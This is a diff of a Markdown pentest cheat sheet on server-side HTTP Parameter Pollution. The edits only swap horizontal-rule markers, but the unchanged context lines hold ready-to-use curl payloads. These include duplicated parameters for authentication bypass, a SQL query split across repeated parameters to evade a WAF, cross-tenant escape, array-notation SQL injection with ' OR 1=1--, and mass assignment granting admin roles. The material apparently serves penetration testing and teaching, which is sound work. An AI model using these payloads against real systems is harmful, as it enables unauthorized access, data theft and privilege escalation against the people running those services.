@@ -17,7 +17,7 @@ linked:
 ---
 # HPP - Server-Side
 
-***
+---
 
 ## Auth / Access Control Bypass
 
@@ -33,7 +33,7 @@ linked:
 | `for combo in 'user=admin&user=attacker' 'user=attacker&user=admin'; do curl "https://target/admin?$combo"; done` | Bulk first/last differential probe | Discovery. |
 ^hpp-server-auth
 
-___
+---
 
 ## WAF / Filter Bypass via Param Split
 
@@ -62,7 +62,7 @@ curl 'https://target/search?q=SELECT&q=*&q=FROM&q=users'
 # Backend gets "SELECT,*,FROM,users" → executes
 ```
 
-___
+---
 
 ## Logic Flow Manipulation
 
@@ -79,7 +79,7 @@ ___
 | `curl "https://target/api?tenant=A&tenant=B"` | Cross-tenant escape | Multi-tenant logic. |
 ^hpp-server-logic
 
-___
+---
 
 ## SQLi en Hidden Param via Concatenation
 
@@ -93,7 +93,7 @@ ___
 | `curl --data-urlencode "id[]=1" --data-urlencode "id[]=' OR 1=1--" https://target/api` | Array notation con SQLi | Java/PHP array. |
 ^hpp-server-sqli
 
-___
+---
 
 ## Mass Assignment Combo
 
@@ -108,4 +108,4 @@ ___
 | `curl -X POST -d "roles[]=user&roles[]=admin" https://target/users/123` | Array notation HPP | Type-confusion variant. |
 ^hpp-server-mass-assign
 
-***
+---
